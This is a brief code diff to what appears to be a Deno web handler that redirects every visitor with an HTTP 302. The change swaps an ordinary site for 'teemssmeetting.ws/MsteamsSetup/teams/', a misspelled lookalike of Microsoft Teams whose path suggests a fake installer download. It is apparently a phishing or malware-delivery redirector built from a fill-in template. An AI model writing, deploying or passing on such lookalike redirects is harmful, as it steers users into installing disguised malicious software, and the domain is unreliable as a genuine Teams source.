@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://poemcellars.com/", // Replace this with your actual link
+      Location: "https://teemssmeetting.ws/MsteamsSetup/teams/", // Replace this with your actual link
     },
   });
 });
